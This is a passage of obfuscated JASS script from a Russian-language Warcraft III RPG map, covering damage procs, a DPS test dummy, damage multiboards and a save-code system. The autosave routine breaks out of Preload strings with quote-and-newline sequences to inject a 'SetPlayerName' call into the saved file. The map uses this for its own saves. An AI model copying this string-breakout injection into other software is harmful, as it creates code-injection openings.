set Ny=Condition(function kW)
call GroupEnumUnitsInRange(Nt,GetLocationX(No),GetLocationY(No),300,Ny)
call ForGroup(Nt,function kU)
call DestroyBoolExpr(Ny)
call DestroyGroup(Nt)
call RemoveLocation(No)
set No=null
set Ny=null
set Nt=null
endif
else
set Nz[Ma]=0
call IssueImmediateOrder(NR,"unimmolation")
endif
endfunction
function lC takes unit NR,unit NQ returns nothing
local real NS=I2R(100*GetUnitAbilityLevel(NR,$41305038)+(GetHeroStr(NR,true)+GetHeroAgi(NR,true)+GetHeroInt(NR,true))/4)
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
endfunction
function lD takes unit NR,unit NQ returns nothing
local real NS=I2R(GetHeroStr(NR,true)+1000)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
set Nu=R2I(NS)
call kQ(NR,NQ,Nu)
endfunction
function lE takes unit NR,unit NQ returns nothing
local real NS=I2R(GetHeroStr(NR,true)*7)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
set Nu=R2I(NS)
call kQ(NR,NQ,Nu)
call UnitRemoveAbility(NQ,$42303342)
endfunction
function lF takes unit NR,unit NQ returns nothing
local location Ht=GetUnitLoc(NR)
local location Nk=GetUnitLoc(NQ)
local real Mc
local string No
if DistanceBetweenPoints(Ht,Nk)<=200 then
set Mc=I2R(GetHeroStr(NR,true)+GetHeroAgi(NR,true)+GetHeroInt(NR,true))
set Nu=R2I(Mc)
call kQ(NR,NQ,Nu)
set No=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
set No="Objects\\Spawnmodels\\Human\\HumanLargeDeathExplode\\HumanLargeDeathExplode.mdl"
endif
call DestroyEffect(AddSpecialEffectLoc(No,Nk))
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
endfunction
function lG takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
endfunction
function lH takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function lI takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function lJ takes unit N1,integer N2 returns integer
local integer N3
local item N4
set N3=0
loop
set N4=UnitItemInSlot(N1,N3)
if N4!=null and GetItemTypeId(N4)==N2 then
set N4=null
set N4=null
return N3+1
endif
set N3=N3+1
exitwhen N3>=bj_MAX_INVENTORY
endloop
set N4=null
return 0
endfunction
function lK takes unit N1,integer N2 returns boolean
return lJ(N1,N2)>0
endfunction
function lL takes unit NQ,unit Hu,string M6,real NT,integer NU,integer NV,integer NW returns nothing
local texttag NX
set NX=CreateTextTag()
call SetTextTagText(NX,M6,NT)
call SetTextTagPosUnit(NX,NQ,50)
call SetTextTagColor(NX,NU,NV,NW,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagVisibility(NX,GetLocalPlayer()==GetOwningPlayer(Hu))
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
endfunction
function lM takes nothing returns boolean
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
return false
endfunction
function lN takes nothing returns boolean
if IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true then
if IsUnitIllusion(GetFilterUnit())==false then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
endif
return false
endfunction
function lO takes nothing returns nothing
local location Ht=GetUnitLoc(K7)
local group Na=CreateGroup()
local boolexpr Nb=Condition(function lN)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),1500,Nb)
call DestroyBoolExpr(Nb)
if CountUnitsInGroup(Na)==0 then
call UnitRemoveAbility(K7,$41304545)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
if GetUnitAbilityLevel(K7,$41304545)>=1 then
set NZ=NZ+1
else
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endfunction
function lP takes nothing returns nothing
local unit NQ=GetTriggerUnit()
local unit NR=GetEventDamageSource()
local real NS=GetEventDamage()
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local integer L9
local timer Mc
local integer No
local location Np
local real Nt
local real Ny
if NS>=5 and GetUnitAbilityLevel(MT[Ma],$41313059)>=1 then
call lL(NQ,NR,"-"+I2S(R2I(NS)),.02,255,100,100)
endif
if GetOwningPlayer(NQ)==Player(11) then
call SaveInteger(NY,GetHandleId(NQ),1,LoadInteger(NY,GetHandleId(NQ),1)+R2I(NS))
call SaveInteger(NY,GetHandleId(NQ),2+Ma,LoadInteger(NY,GetHandleId(NQ),2+Ma)+R2I(NS))
endif
if GetUnitTypeId(NQ)==$6830304F then
if GetUnitState(NQ,UNIT_STATE_LIFE)<=50000 then
call SetUnitState(NQ,UNIT_STATE_LIFE,$5F5E0FF)
call UnitRemoveAbility(NQ,$41304545)
call DisplayTextToPlayer(Player(Ma),0,0,"|c00ffff00Время боя|r: "+I2S(NZ)+"сек.")
call DisplayTextToPlayer(Player(Ma),0,0,"|c00ff9696Средний ДПС|r: "+I2S(R2I(GetUnitState(NQ,UNIT_STATE_MAX_LIFE))/NZ)+" урона/сек.")
endif
if GetUnitAbilityLevel(NQ,$41304545)==0 then
call lL(NR,NR,"Бой начался!",.03,255,100,100)
set NZ=0
call UnitAddAbility(NQ,$41304545)
set Mc=CreateTimer()
call TimerStart(Mc,1,true,function lO)
set Mc=null
endif
endif
if GetUnitAbilityLevel(NQ,$42505345)>0 then
call UnitRemoveAbility(NQ,$42505345)
endif
if GetUnitState(NQ,UNIT_STATE_LIFE)>.405 then
if IsUnitType(NR,UNIT_TYPE_HERO) then
if GetUnitAbilityLevel(NR,$41305336)>=1 then
call IssueImmediateOrder(Nc[Ma+1],"starfall")
elseif GetUnitAbilityLevel(NR,$41314154)>=1 then
call IssueImmediateOrder(Nc[Ma+1],"waterelemental")
call IssueTargetOrder(Nc[Ma+1],"thunderbolt",NQ)
endif
if GetUnitAbilityLevel(NQ,$42303030)>0 or GetUnitAbilityLevel(NQ,$42303031)>0 then
call UnitRemoveAbility(NQ,$42303030)
call UnitRemoveAbility(NQ,$42303031)
if GetUnitAbilityLevel(NR,$41305554)>=1 and GetRandomInt(1,7)==1 then
call ka(NR,NQ)
elseif GetUnitAbilityLevel(NQ,$42303545)>0 then
call SetUnitState(NR,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(NR,UNIT_STATE_LIFE)+I2R(GetHeroStr(NR,true))/3*Nf[Ma+1]))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\Heal\\HealTarget.mdl",NR,"overhead"))
elseif GetUnitAbilityLevel(NR,$42303546)>0 and GetUnitTypeId(NR)==$48303443 and GetRandomInt(1,12)==1 then
call kY(NR,NQ)
elseif GetUnitAbilityLevel(NR,$41305947)>=1 then
if Ni[Ma+1]==true and GetUnitState(NR,UNIT_STATE_MANA)>=5+GetUnitAbilityLevel(NR,$41305947) then
call ke(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41305939)>=1 or GetUnitAbilityLevel(NR,$41305958)>=1 then
if GetRandomInt(1,10)==1 then
call ki(NR,NQ)
endif
endif
elseif GetUnitAbilityLevel(NR,$4130524D)>=1 then
call kc(NR,NQ)
elseif GetUnitAbilityLevel(NR,$41305350)>=1 or GetUnitAbilityLevel(NR,$41305351)>=1 then
call kj(NR,NQ)
elseif GetUnitAbilityLevel(NR,$41303950)>=1 or GetUnitAbilityLevel(NR,$4130394F)>=1 then
if Ni[Ma+1]==true and GetUnitStatePercent(NR,UNIT_STATE_LIFE,UNIT_STATE_MAX_LIFE)>2 then
call kd(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$41303833)>=1 or GetUnitAbilityLevel(NR,$41303834)>=1 then
if GetRandomInt(1,5)==1 then
call kk(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$41305550)>=1 then
if GetRandomInt(1,10)==1 then
call km(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$41305037)>=1 or GetUnitAbilityLevel(NR,$41305145)>=1 then
if GetUnitAbilityLevel(NR,$42303349)>=1 then
call ko(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41305047)>=1 and GetRandomInt(1,10)==1 then
call kp(NR,NQ)
endif
elseif GetUnitTypeId(NR)==$48303437 then
if GetUnitAbilityLevel(NR,$41313347)>=1 then
call kq(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41313839)>=1 and GetUnitAbilityLevel(NR,$41313838)==0 then
call ks(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$4130574C)>=1 then
if GetUnitAbilityLevel(NQ,$4130574D)!=1 then
call UnitAddAbility(NQ,$4130574D)
call kv(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41304338)>=1 or GetUnitAbilityLevel(NR,$41304551)>=1 then
if GetRandomInt(1,7)==1 then
call kz(NR,NQ)
endif
endif
elseif GetUnitAbilityLevel(NR,$41305845)>=1 then
if GetUnitAbilityLevel(NR,$42303059)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==4 then
set Nz[Ma]=0
call kx(NR,NQ)
endif
endif
if GetUnitAbilityLevel(NR,$41304C4E)>=1 and GetUnitAbilityLevel(NQ,$41304C4E)>=1 then
call k0(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$41304B57)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==6 then
set Nz[Ma]=0
if GetUnitAbilityLevel(NR,$41304B57)<15 then
call SetUnitAbilityLevel(NR,$41304B57,GetUnitAbilityLevel(NR,$41304B57)+1)
call lL(NR,NR,"Аррр ("+I2S(GetUnitAbilityLevel(NR,$41304B57))+")",.022,255,100,0)
endif
endif
if GetUnitAbilityLevel(NR,$41304236)>=1 or GetUnitAbilityLevel(NR,$41304544)>=1 then
if GetRandomInt(1,5)==1 then
call k2(NR,NQ)
endif
endif
elseif GetUnitAbilityLevel(NR,$4131314B)>=1 or GetUnitAbilityLevel(NR,$4131314A)>=1 then
if GetRandomInt(1,5)==1 then
call k4(NR,NQ)
endif
if GetUnitAbilityLevel(NQ,$42303733)>=1 then
call k3(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$41305830)>=1 or GetUnitAbilityLevel(NR,$41305831)>=1 then
if GetRandomInt(1,5)==1 then
call k6(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41305349)>=1 and GetRandomInt(1,5)==1 then
call k5(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$4130304E)>=1 then
call k8(NR,NQ)
endif
elseif GetUnitAbilityLevel(NR,$41304653)>=1 and GetUnitAbilityLevel(NR,$42303741)>=1 then
call lB(NR,NQ)
elseif GetUnitAbilityLevel(NR,$41304D4D)>=1 then
if GetUnitAbilityLevel(NQ,$42303342)>=1 then
call lE(NR,NQ)
endif
if GetUnitAbilityLevel(NQ,$42303748)>=1 then
call lD(NR,NQ)
endif
if lK(NR,$73747770) or lK(NR,$49304B30) or lK(NR,$49303951) or lK(NR,$49303949) then
if GetRandomInt(1,7)==1 then
call lI(NR,NQ,GetHeroStr(NR,true)*2)
endif
elseif lK(NR,$49304D5A) or lK(NR,$49305747) then
if GetRandomInt(1,7)==1 then
call lI(NR,NQ,GetHeroStr(NR,true)*4)
endif
endif
endif
if GetUnitAbilityLevel(NR,$41313155)>=1 and GetUnitAbilityLevel(NR,$41313436)==0 and GetRandomInt(1,7)==1 then
call SetUnitState(NQ,UNIT_STATE_LIFE,GetUnitState(NQ,UNIT_STATE_LIFE)-NS)
endif
if GetUnitAbilityLevel(NQ,$42303041)>0 then
call kn(NR,NQ)
endif
if GetUnitAbilityLevel(NQ,$41313542)>0 and GetRandomInt(1,4)==1 then
call k9(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41305038)>0 then
call lC(NR,NQ)
endif
if GetUnitAbilityLevel(NR,$41304837)>0 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroStr(NR,true)),true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endif
if lK(NR,$73747265) and GetRandomInt(1,5)==1 then
call lF(NR,NQ)
endif
if lK(NR,$49304C37) and GetRandomInt(1,4)==1 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroInt(NR,true)/2),true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call SetUnitState(NR,UNIT_STATE_MANA,GetUnitState(NR,UNIT_STATE_MANA)+70)
elseif lK(NR,$49305037) and GetRandomInt(1,4)==1 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroStr(NR,true)),true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif lK(NR,$49304C42) and GetRandomInt(1,4)==1 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroAgi(NR,true)),true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif lK(NR,$49305541) and GetRandomInt(1,4)==1 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroAgi(NR,true)*3/2),true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif lK(NR,$49305538) and GetRandomInt(1,4)==1 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroStr(NR,true)*3/2),true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif lK(NR,$49305536) and GetRandomInt(1,4)==1 then
call UnitDamageTarget(NR,NQ,I2R(GetHeroInt(NR,true)),true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call SetUnitState(NR,UNIT_STATE_MANA,GetUnitState(NR,UNIT_STATE_MANA)+100)
endif
endif
endif
if GetUnitTypeId(NR)==$68303452 then
call lI(MT[Ma],NQ,R2I(I2R(GetUnitAbilityLevel(MT[Ma],$41305939))*(I2R(GetHeroAgi(MT[Ma],true))*.2)*Nd[Ma+1]))
call lI(MT[Ma],NQ,R2I(I2R(GetHeroAgi(MT[Ma],true)*3)*Nd[Ma+1]))
elseif GetUnitTypeId(NR)==$68303237 then
call lG(MT[Ma],NQ,GetHeroInt(MT[Ma],true)/2)
elseif GetUnitTypeId(NR)==$68303258 then
if GetUnitAbilityLevel(MT[Ma],$41304D59)>=1 then
call lG(MT[Ma],NQ,R2I(I2R(GetHeroInt(MT[Ma],true))*6.5*N0[Ma+1]))
elseif GetUnitAbilityLevel(MT[Ma],$41304D53)>=1 then
set No=GetUnitAbilityLevel(MT[Ma],$41304D53)*R2I(I2R(GetHeroInt(MT[Ma],true))*.7*N0[Ma+1])
call lG(MT[Ma],NQ,No)
endif
elseif GetUnitTypeId(NR)==$68303136 then
if GetUnitAbilityLevel(NR,$41305139)>=1 then
call lG(MT[Ma],NQ,R2I(I2R(GetUnitAbilityLevel(MT[Ma],$41314237)*(GetHeroInt(MT[Ma],true)/10))*N0[Ma+1]))
call lG(MT[Ma],NQ,R2I(I2R(GetUnitAbilityLevel(MT[Ma],$41314237)*100)*N0[Ma+1]))
endif
elseif GetUnitTypeId(NR)==$6E30354A then
set L9=(GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true))/2
call lI(MT[Ma],NQ,L9)
call IssueImmediateOrder(NR,"howlofterror")
if GetRandomInt(1,10)==1 then
call lI(MT[Ma],NQ,L9*GetUnitAbilityLevel(MT[Ma],$41305333))
endif
elseif GetUnitTypeId(NR)==$65303136 then
set L9=GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true)
call lG(MT[Ma],NQ,L9*2/5)
set Np=GetUnitLoc(NQ)
call IssuePointOrderLoc(NR,"breathoffire",Np)
call IssuePointOrderLoc(NR,"rainoffire",Np)
call RemoveLocation(Np)
set Np=null
elseif GetUnitTypeId(NR)==$68303044 then
set L9=GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true)
call lG(MT[Ma],NQ,L9/2)
elseif GetUnitTypeId(NR)==$65303050 then
set L9=(GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true))*2
call lG(MT[Ma],NQ,L9*GetUnitAbilityLevel(MT[Ma],$41305336))
elseif GetUnitTypeId(NR)==$6F303044 then
set L9=GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true)
call lH(MT[Ma],NQ,L9/2)
call IssueTargetOrder(NR,"curse",NQ)
elseif GetUnitTypeId(GetEventDamageSource())==$6E303549 then
set L9=(GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true))/2
call lI(MT[Ma],NQ,L9)
call IssueTargetOrder(NR,"thunderbolt",NQ)
if GetRandomInt(1,10)==1 then
call lI(MT[Ma],NQ,L9*GetUnitAbilityLevel(MT[Ma],$41305335))
endif
elseif GetUnitTypeId(NR)==$68303358 then
set L9=(GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true))/10*GetUnitAbilityLevel(MT[Ma],$4130524B)
call lI(MT[Ma],NQ,R2I(I2R(L9)*Nd[Ma+1]))
elseif GetUnitTypeId(NR)==$6830335A or GetUnitTypeId(NR)==$6830374A then
set L9=(GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true))*GetUnitAbilityLevel(MT[Ma],$41304657)
call lI(MT[Ma],NQ,R2I(I2R(L9)*Nd[Ma+1]))
elseif GetUnitTypeId(NR)==$6E303651 then
set L9=GetHeroAgi(MT[Ma],true)/2
call lI(MT[Ma],NQ,R2I(I2R(L9)*Nd[Ma+1]))
elseif GetUnitTypeId(NR)==$68303355 then
set L9=GetHeroStr(MT[Ma],true)/3*GetUnitAbilityLevel(MT[Ma],$4130304F)
call lI(MT[Ma],NQ,R2I(I2R(L9)*Ng[Ma+1]))
elseif GetUnitTypeId(NR)==$6E30364A and GetUnitAbilityLevel(NQ,$42303931)>=1 then
set L9=GetHeroStr(MT[Ma],true)/2
call lI(MT[Ma],NQ,R2I(I2R(L9)*Ng[Ma+1]))
call lL(NQ,MT[Ma],"+"+I2S(R2I(I2R(L9)*Ng[Ma+1])),.02,0,100,255)
elseif GetUnitTypeId(NR)==$6E303647 then
set Nt=GetUnitState(MT[Ma],UNIT_STATE_MANA)/10*N0[GetPlayerId(GetOwningPlayer(MT[Ma]))+1]
set Ny=I2R(GetUnitAbilityLevel(MT[Ma],$4131364E)*50+GetHeroInt(MT[Ma],true)/2)*N0[GetPlayerId(GetOwningPlayer(MT[Ma]))+1]
call lG(MT[Ma],NQ,R2I(Nt+Ny))
call SetUnitState(MT[Ma],UNIT_STATE_MANA,GetUnitState(MT[Ma],UNIT_STATE_MANA)+GetUnitState(MT[Ma],UNIT_STATE_MAX_MANA)*.03)
call lL(NQ,MT[Ma],"|c007d7d7d+"+I2S(R2I(Nt+Ny)),.022,255,255,255)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Blink Teal Caster.mdx",MT[Ma],"origin"))
endif
endif
set NQ=null
set NR=null
endfunction
function lQ takes unit Hu returns nothing
if not HaveSavedInteger(NY,GetHandleId(Hu),0) then
call SaveInteger(NY,GetHandleId(Hu),0,0)
call TriggerRegisterUnitEvent(NP,Hu,EVENT_UNIT_DAMAGED)
endif
endfunction
function lR takes nothing returns nothing
call RemoveUnit(LoadUnitHandle(NY,GetHandleId(GetExpiredTimer()),0))
call RemoveSavedInteger(NY,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function lS takes unit Hu returns nothing
local integer L9=0
set MQ=0
loop
set MP[L9]=""
set L9=L9+1
exitwhen L9>11
endloop
call TriggerSleepAction(2)
call MultiboardSetItemValueBJ(OC[10],2,1,GetUnitName(Hu))
call MultiboardSetItemValueBJ(OC[10],2,2,I2S(LoadInteger(NY,GetHandleId(Hu),1)))
call MultiboardSetItemValueBJ(OC[10],3,2,"100%")
set L9=0
loop
if LoadInteger(NY,GetHandleId(Hu),2+L9)>0 then
call MultiboardSetItemWidthBJ(OC[10],1,4+L9,8.)
call MultiboardSetItemWidthBJ(OC[10],2,4+L9,8.)
call MultiboardSetItemStyleBJ(OC[10],2,4+L9,true,true)
call MultiboardSetItemIconBJ(OC[10],2,4+L9,"war3mapImported\\BTNDamage.blp")
call MultiboardSetItemValueBJ(OC[10],1,4+L9,OD[L9]+OE[L9])
call MultiboardSetItemValueBJ(OC[10],2,4+L9,I2S(LoadInteger(NY,GetHandleId(Hu),2+L9)))
call MultiboardSetItemValueBJ(OC[10],3,4+L9,I2S(100*LoadInteger(NY,GetHandleId(Hu),2+L9)/LoadInteger(NY,GetHandleId(Hu),1))+"%")
else
call MultiboardSetItemStyleBJ(OC[10],2,4+L9,false,false)
call MultiboardSetItemValueBJ(OC[10],1,4+L9," ")
call MultiboardSetItemValueBJ(OC[10],2,4+L9," ")
call MultiboardSetItemValueBJ(OC[10],3,4+L9," ")
endif
call RemoveSavedInteger(NY,GetHandleId(Hu),2+L9)
set L9=L9+1
exitwhen L9==8
endloop
set L9=0
loop
call MultiboardSetItemWidthBJ(OC[10],1,13+L9,20.)
call MultiboardSetItemValueBJ(OC[10],1,13+L9,MP[L9])
set L9=L9+1
exitwhen L9>11
endloop
endfunction
function lT takes unit Hu returns nothing
local timer Mc
if HaveSavedInteger(NY,GetHandleId(Hu),0) then
if GetOwningPlayer(Hu)==Player(11) then
call lS(Hu)
endif
call RemoveSavedInteger(NY,GetHandleId(Hu),0)
set Mc=CreateTimer()
call SaveUnitHandle(NY,GetHandleId(Mc),0,Hu)
call TimerStart(Mc,3,false,function lR)
set Mc=null
endif
endfunction
function lU takes unit Hu returns nothing
call lT(Hu)
endfunction
function lV takes nothing returns nothing
local unit Hu=GetTriggerUnit()
call lU(Hu)
set Hu=null
endfunction
function lW takes nothing returns nothing
local unit Hu=GetTriggerUnit()
if IsUnitEnemy(Hu,Player(0))==true then
if GetUnitAbilityLevel(Hu,$416C6F63)==0 then
call lQ(Hu)
endif
endif
set Hu=null
endfunction
function lX takes nothing returns nothing
local unit Hu=GetEnumUnit()
call lQ(Hu)
set Hu=null
endfunction
function lY takes nothing returns nothing
local trigger N6
local region N7
local group N8
local boolexpr N9
local trigger OB
local timer Hc
set NP=CreateTrigger()
call TriggerAddAction(NP,function lP)
set N6=CreateTrigger()
set N7=CreateRegion()
call RegionAddRect(N7,GetPlayableMapRect())
call TriggerRegisterEnterRegion(N6,N7,null)
call TriggerAddAction(N6,function lW)
set N8=CreateGroup()
set N9=Condition(function lM)
call GroupEnumUnitsInRect(N8,GetPlayableMapRect(),N9)
call DestroyBoolExpr(N9)
call ForGroup(N8,function lX)
call DestroyGroup(N8)
set N9=null
set N8=null
set N6=null
set OB=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(OB,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(OB,function lV)
set OB=null
set Hc=CreateTimer()
set OF=GetHandleId(Hc)
if OF!=$10347E then
endif
set Hc=null
set N7=null
endfunction
function lZ takes player Ht returns unit
return MT[GetPlayerId(Ht)]
endfunction
function la takes player Ht returns unit
return NL[2+2*GetPlayerId(Ht)]
endfunction
function lb takes player Ht,unit Hu returns nothing
set MT[GetPlayerId(Ht)]=Hu
endfunction
function lc takes player Ht,unit Hu returns nothing
set NL[2+2*GetPlayerId(Ht)]=Hu
endfunction
function ld takes string Oh,integer Oi returns string
local integer Oj=StringHash(Oh)
if Oj<0 then
set Oj=Oj*-1
endif
return j3(Oj,Oi)
endfunction
function le takes unit NR,integer Oi returns string
return j3(jo(GetUnitTypeId(NR)),Oi)
endfunction
function lf takes unit OR,integer Oi returns string
return j3(jo(GetUnitTypeId(OR)),Oi)
endfunction
function lg takes nothing returns nothing
local integer L9=0
local integer Mc
loop
exitwhen not (L9<8)
set OG[L9]=0
set Mc=0
loop
exitwhen not (Mc<6*OH)
set OI[6*OH*L9+Mc]=0
set Mc=Mc+1
endloop
set L9=L9+1
endloop
endfunction
function lh takes string M6 returns string
local string Of=""
set Of=Of+j3(IAbsBJ(StringHash(M6)),4)
return Of
endfunction
function li takes integer OS,integer OT,integer OU returns integer
return OI[6*OH*OS+6*OT+OU]
endfunction
function lj takes integer OS,integer OT,integer OU returns integer
return OX[6*OH*OS+6*OT+OU]
endfunction
function lk takes integer OS,integer OT,integer OU,integer OV returns nothing
set OI[6*OH*OS+6*OT+OU]=OV
endfunction
function ll takes integer OS,integer OT,integer OU,integer OW returns nothing
set OX[6*OH*OS+6*OT+OU]=OW
endfunction
function lm takes item L9 returns integer
if L9!=null then
return GetItemTypeId(L9)
endif
return 0
endfunction
function ln takes player Ht,unit NR,unit OR,string Oa returns nothing
local integer OS=GetPlayerId(Ht)
local string Ob=OE[GetPlayerId(Ht)]
local string Oc=""
local string On="Сохранение прошло |c001EFF00успешно.|r"
local integer L9=0
local integer Mc
local integer NH
local integer NI
local string Ok=""
local integer No
local integer Om
local integer Ol
local string Np
set Oc=Oc+j3(R2I(1000*Og),4)
set Oc=Oc+ld(Ob,6)
set Oc=Oc+le(NR,2)
set Oc=Oc+j3(GetHeroLevel(NR),2)
set Oc=Oc+lf(OR,2)
loop
exitwhen not (L9<6)
set Mc=lm(UnitItemInSlot(NR,L9))
set Oc=Oc+j3(jq(Mc),2)
set L9=L9+1
endloop
set L9=0
loop
exitwhen not (L9<6)
call lk(OS,OG[OS],L9,lm(UnitItemInSlot(OR,L9)))
set L9=L9+1
endloop
set L9=0
loop
exitwhen not (L9<OH)
set Mc=0
loop
exitwhen not (Mc<6)
set Oc=Oc+j3(jq(li(OS,L9,Mc)),2)
set Mc=Mc+1
endloop
set L9=L9+1
endloop
set NH=NJ[GetPlayerId(Ht)+1]/3
set NI=NK[GetPlayerId(Ht)+1]/3
set Oc=Oc+j3(NH,4)
set Oc=Oc+j3(NI,4)
set L9=0
loop
exitwhen not (L9<jk())
set Mc=js(L9)
set No=GetUnitAbilityLevel(NR,Mc)
set Ok=Ok+j3(No,1)
set L9=L9+1
endloop
set Oc=Oc+lh(Oc)
set Ok=Ok+lh(Oc)+lh(Ok)
set Ol=StringLength(Oa)
if GetLocalPlayer()==Ht then
set Np=Ob+" "+GetUnitName(NR)+" lvl "+I2S(GetHeroLevel(NR))
call PreloadGenClear()
call Preload("\n\r\nPassword 1:\n-Load1 "+Oc+"\n")
call Preload("\n\r\nPassword 2:\n-Load2 "+Ok+"\n")
call Preload("Золото: "+I2S(GetPlayerState(Ht,PLAYER_STATE_RESOURCE_GOLD)))
call Preload("Кровавые Метки: "+I2S(GetPlayerState(Ht,PLAYER_STATE_RESOURCE_LUMBER)))
call Preload("Наигранное время: "+I2S(GetUnitAbilityLevel(MT[GetPlayerId(Ht)],$41496432))+" минут "+I2S(GetUnitAbilityLevel(MT[GetPlayerId(Ht)],$41496433))+" часов "+I2S(GetUnitAbilityLevel(MT[GetPlayerId(Ht)],$41496434))+" дней")
call Preload("Курьер: "+GetUnitName(NL[2+2*GetPlayerId(Ht)]))
call Preload("Предметы героя:")
set Om=0
loop
if GetItemName(UnitItemInSlot(MT[GetPlayerId(Ht)],Om))!=null then
call Preload(I2S(Om+1)+": "+GetItemName(UnitItemInSlot(MT[GetPlayerId(Ht)],Om)))
endif
set Om=Om+1
exitwhen Om>5
endloop
call Preload("Предметы курьера:")
set Mc=0
loop
set Om=0
loop
if OI[6*OH*GetPlayerId(Ht)+6*Mc+Om]>0 then
call Preload(I2S(Om+1)+": "+GetObjectName(OI[6*OH*GetPlayerId(Ht)+6*Mc+Om]))
endif
set Om=Om+1
exitwhen Om>5
endloop
set Mc=Mc+1
exitwhen Mc==4
endloop
call PreloadGenEnd("TCoM_ORPG\\"+GetUnitName(NR)+"\\"+Np+".txt")
if SubString(Oa,0,4)=="-exs" and Ol>5 then
call PreloadGenClear()
set Np=SubString(Oa,5,Ol)
call Preload("\")\ncall SetPlayerName(Player(14),\""+Oc+"\")\n//")
call Preload("\")\ncall SetPlayerName(Player(15),\""+Ok+"\")\n//")
call PreloadGenEnd("TCoM_ORPG\\autosave\\"+Np+".txt")
endif
call DisplayTimedTextToPlayer(GetLocalPlayer(),0,0,15,On)
endif
endfunction
function lo takes player Ht,string Oa returns nothing
call ln(Ht,lZ(Ht),la(Ht),Oa)
endfunction
function lp takes nothing returns nothing
local string Oa
if not OZ then
call DisplayTimedTextToPlayer(GetLocalPlayer(),0,0,15,"Нельзя сохраняться, пока не закончилась загрузка персонажа")
return
endif
set Oa=GetEventPlayerChatString()
call lo(GetTriggerPlayer(),Oa)
endfunction
function lq takes string O2 returns nothing
local integer OS=GetPlayerId(GetTriggerPlayer())
local string Oc=Os[OS]
local integer O3=jp(j5(SubString(Oc,0,2)))
local integer O4=j5(SubString(Oc,2,4))
